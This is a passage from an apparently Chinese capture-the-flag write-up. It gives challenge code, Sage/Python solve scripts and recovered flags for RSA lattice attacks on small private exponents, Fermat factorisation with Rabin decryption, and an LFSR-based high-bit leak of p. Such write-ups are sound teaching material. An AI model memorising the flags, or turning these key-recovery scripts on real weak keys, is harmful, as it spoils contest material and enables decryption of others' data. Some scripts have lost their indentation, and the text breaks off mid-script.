title="LATTICE"></a>LATTICE</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">_length = <span class="built_in">len</span>(flag)</span><br><span class="line">f1, f2, f3 = [flag[_*_length//<span class="number">3</span>:(_+<span class="number">1</span>)*_length//<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">m1 = bytes_to_long(f1)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">phi1 = n1 - p1 - q1 + <span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">e1 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line">e2 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1=<span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1=<span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c1=...</span></span><br><span class="line"><span class="comment"># n1=...</span></span><br><span class="line"><span class="comment"># e1, e2=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">m2 = bytes_to_long(f2)</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">phi2 = n2 - p2 - q2 + <span class="number">1</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">e1 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e2 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e3 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2=<span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2, e3=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>, <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c2=...</span></span><br><span class="line"><span class="comment"># n2=...</span></span><br><span class="line"><span class="comment"># e1, e2, e3=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line">m3 = bytes_to_long(f3)</span><br><span class="line">nl = []</span><br><span class="line">cl = []</span><br><span class="line">el = []</span><br><span class="line">d = getPrime(<span class="number">890</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    phi3 = n3 - p3 - q3 + <span class="number">1</span></span><br><span class="line">    e3 = invert(d, phi3)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3, e3, n3)</span><br><span class="line">    nl.append(n3)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e3))</span><br><span class="line">    cl.append(<span class="built_in">int</span>(c3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;nl=<span class="subst">&#123;nl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;el=<span class="subst">&#123;el&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cl=<span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># nl=[...]</span></span><br><span class="line"><span class="comment"># el=[...]</span></span><br><span class="line"><span class="comment"># cl=[...]</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA的两种涉及格的LLL算法的攻击情形（多组低解密指数攻击+共私钥指数攻击）。</p><p>Part1，2组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;89c63fd5-00c&#x27;</span></span><br></pre></td></tr></table></figure><p>Part2，3组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">e3 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">    M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">    M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">    M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">    M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi_)</span><br><span class="line">        m = <span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:]</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;f-4ae0-b369-&#x27; </span></span><br></pre></td></tr></table></figure><p>Part3，共私钥指数 $d$ 攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">nl=[...]</span><br><span class="line">el=[...]</span><br><span class="line">cl=[...]</span><br><span class="line">ind=[]</span><br><span class="line">nl_s=<span class="built_in">sorted</span>(nl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ind.append(nl.index(nl_s[i]))</span><br><span class="line"><span class="built_in">print</span>(ind)</span><br><span class="line">e=[]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    e.append(el[ind[i]])</span><br><span class="line">    n.append(nl[ind[i]])</span><br><span class="line">    c.append(cl[ind[i]])</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">6</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">a[<span class="number">0</span>]=[M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>],e[<span class="number">5</span>],e[<span class="number">6</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">6</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">5</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">7</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">6</span>],<span class="built_in">int</span>(d),<span class="built_in">int</span>(n[<span class="number">6</span>])))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;5a3d94a20a2c&#x27;</span></span><br></pre></td></tr></table></figure><p>连接得flag：flag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c}</p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????&#x27;</span></span><br><span class="line"></span><br><span class="line">z=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=sympy.nextprime(z)</span><br><span class="line">q=sympy.prevprime(<span class="number">10</span>*z)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">e=<span class="number">0xe18e</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n= ...</span></span><br><span class="line"><span class="comment">#c= ...</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解RSA，发现 $\gcd(e,\varphi(n))=2$，令 $e’=\frac{e}{2},m’=m^2$，</p><p>先求出 $m’$，再利用Rabin算法求 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0xe18e</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(n//<span class="number">10</span>,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">m = rabin_decrypt(mm,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="BABY-RSA"><a href="#BABY-RSA" class="headerlink" title="BABY-RSA"></a>BABY-RSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">c = <span class="built_in">pow</span>(num, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(hp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">str</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= ...</span></span><br><span class="line"><span class="string">c= ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key:</span></span><br><span class="line"><span class="string">0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA $p$ 高位泄露攻击+LFSR。</p><p>先用LFSR结果异或还原 $p$ 高位 $hp$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#xx27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">hp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">hp += <span 